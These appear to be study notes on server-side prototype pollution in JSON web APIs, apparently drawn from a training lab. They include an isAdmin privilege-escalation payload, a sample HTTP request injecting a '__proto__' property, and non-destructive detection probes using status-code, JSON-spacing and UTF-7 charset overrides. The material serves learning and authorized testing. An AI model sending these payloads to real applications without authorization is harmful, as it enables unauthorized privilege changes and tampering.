
- Alternative for __proto__ is constructor.prototype and alternative to 
```
{"__proto__":{"isAdmin":"true"}}
```
is
```
"constructor": {
    "prototype": {
        "json spaces":10
    }
}
```

## SSTI prototype pollution:
Basic way:
```
POST /user/update HTTP/1.1
Host: vulnerable-website.com
...
{
    "user":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "__proto__":{
        "foo":"bar"
    }
}
```
This creates a new property called foo with value bar and if foo already exists and can be edited it overrides its value.


Ways to check proto pollution in non-destructive way:
Change status code: Try for between 400-599 else it might default to 500.
Change spaces in JSON : Good as we can reset it back to default and thus not cause any actual changes. (Fixed in 4.17.4)
Charset override : If you POST this kind of request body:
```
{
    "username":"wiener",
    "role":"+AGYAbwBv-"
}
```
where `+AGYAbwBv-` is utf-7 encoded and then proto-pollute to change charset to utf-7,in the response you might see actual value reflected:
```
{
    "username":"wiener",
    "role":"foo"
}
```

